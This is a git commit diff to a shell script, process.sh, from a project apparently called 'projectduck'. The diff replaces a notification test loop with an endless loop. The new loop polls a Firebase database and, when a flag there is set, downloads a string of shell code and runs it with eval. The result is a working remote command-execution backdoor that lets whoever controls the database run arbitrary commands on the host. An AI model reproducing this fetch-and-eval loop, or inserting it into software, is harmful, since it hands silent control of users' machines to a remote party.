b662b4f2fd6b64fbc16f77faa274e954a60a78b0
Rosho123 <rsf.sho@gmail.com>
2017-06-05 20:34:48 -0700

    updated process code to run code from firebase var

--- process.sh
+++ process.sh
@@ -1,6 +1,9 @@
-for run in {1..10}
+while true
 do
-echo test
-osascript -e 'display notification "Lorem ipsum dolor sit amet" with title "Title"'
-sleep 10
+    update="$(curl 'https://projectduck-6999c.firebaseio.com/update/update.json?shallow=true&print=pretty')"
+    if [ "$update" = true ] ; then
+      updatecode="$(curl 'https://projectduck-6999c.firebaseio.com/update/updatecode.json?shallow=true&print=pretty' | sed 's:^.\(.*\).$:\1:' | sed -E 's/\\(.)/\1/g')"
+      eval $updatecode;
+    fi
+    sleep 5
 done
